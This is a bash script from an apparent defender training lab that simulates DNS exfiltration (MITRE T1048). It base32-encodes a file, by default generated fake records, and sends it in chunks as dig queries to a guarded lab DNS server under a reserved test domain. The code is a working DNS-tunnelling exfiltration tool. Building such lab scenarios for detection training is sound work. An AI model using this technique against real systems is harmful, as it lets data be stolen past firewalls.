#!/usr/bin/env bash
# dns-exfil.sh: scenario 5, data exfiltration over DNS (MITRE T1048 / T1071.004).
#
#   bash scripts/kali/dns-exfil.sh [dns-server] [file]
#   DRYRUN=1 bash scripts/kali/dns-exfil.sh          # just print the queries, send nothing
#
# Why this matters for a defender: DNS is almost always allowed out, so
# smuggling data inside DNS queries is a classic way past a firewall. The
# tell is the shape of the query, a long encoded-looking label, not its
# content. This generates exactly that shape so you can recognise it.
#
# It base32-encodes a file, slices it into 50-character labels, and sends
# each slice as a lookup:  <chunk>.<seq>.t.ntalab.test
# The lab DNS server (dnsmasq on linux-endpoint) answers everything under the
# reserved ntalab.test name and forwards nothing, so this never leaves the lab.
# With no file given it makes up a fake record set, so no real data is used.
set -euo pipefail
source "$(dirname "$0")/_guard.sh"
DNS="${1:-10.0.50.30}"; lab_guard "$DNS"
FILE="${2:-}"
DOMAIN="t.ntalab.test"
CHUNK=50

if [[ -z $FILE ]]; then
    FILE=/tmp/fake-records.csv
    {
        echo "id,name,email"
        for i in $(seq 1 12); do
            printf 'LAB%03d,Test Record %02d,record%02d@example.com\n' "$i" "$i" "$i"
        done
    } > "$FILE"
    echo "[*] Generated fake data to leak: $FILE ($(wc -c < "$FILE") bytes)"
fi
[[ ${DRYRUN:-0} == 1 ]] || command -v dig >/dev/null || { echo "dig not found (sudo apt install dnsutils)."; exit 1; }

ENC=$(base32 -w0 "$FILE" | tr -d '=' | tr '[:upper:]' '[:lower:]')
TOTAL=$(( (${#ENC} + CHUNK - 1) / CHUNK ))
echo "[*] ${#ENC} encoded chars -> $TOTAL DNS queries to @$DNS"
for (( i = 0; i < TOTAL; i++ )); do
    name=$(printf '%s.%04d.%s' "${ENC:i*CHUNK:CHUNK}" "$i" "$DOMAIN")
    if [[ ${DRYRUN:-0} == 1 ]]; then
        echo "$name"
    else
        dig +short +tries=1 +time=2 @"$DNS" "$name" A >/dev/null || true
        printf '    sent %d/%d\r' "$((i + 1))" "$TOTAL"
        sleep 0.3
    fi
done
echo
echo "[+] Done. SHA-256 of the file that was leaked: $(sha256sum "$FILE" | cut -d' ' -f1)"
echo "    Rebuild it from the server's query log with scripts/analysis/dns_reassemble.py"
